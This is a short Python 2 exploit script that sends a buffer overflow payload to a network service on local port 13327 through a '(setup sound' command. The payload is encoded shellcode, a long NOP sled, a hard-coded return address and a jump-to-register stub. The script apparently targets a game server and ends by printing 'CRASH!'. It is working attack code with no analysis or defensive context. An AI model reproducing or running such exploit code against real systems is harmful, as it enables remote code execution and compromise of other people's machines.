import socket

host = '127.0.0.1'
port = 13327

shellcode = ("\xd9\xc9\xd9\x74\x24\xf4\xbe\xc3\x9c\x90\x59\x5f\x2b\xc9" +
"\xb1\x14\x31\x77\x19\x83\xc7\x04\x03\x77\x15\x21\x69\xa1" +
"\x82\x52\x71\x91\x77\xcf\x1c\x14\xf1\x0e\x50\x7e\xcc\x50" +
"\xca\x21\x9c\x38\xef\xdd\x31\xe4\x85\xcd\x60\x44\xd3\x0f" +
"\xe8\x02\xbb\x02\x6d\x43\x7a\x99\xdd\x57\xcd\xc7\xec\xd7" +
"\x6e\xb8\x89\x1a\xf0\x2b\x0c\xce\xce\x13\x62\x8e\x78\xdd" +
"\x84\xe6\x55\x32\x06\x9e\xc1\x63\x8a\x37\x7c\xf5\xa9\x97" +
"\xd3\x8c\xcf\xa7\xdf\x43\x8f")

payload = shellcode + "\x90"*(4368 - len(shellcode)) + "\x97\x45\x13\x08" + "\x83\xc0\x0c\xff\xe0" + "\x90\x90"

buffer = "\x11(setup sound " + payload + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print 'connecting...'
s.connect((host, port))
print s.recv(1024)
print 'sending buffer...'
s.send(buffer)
print s.recv(1024)
s.close()
print 'CRASH!'

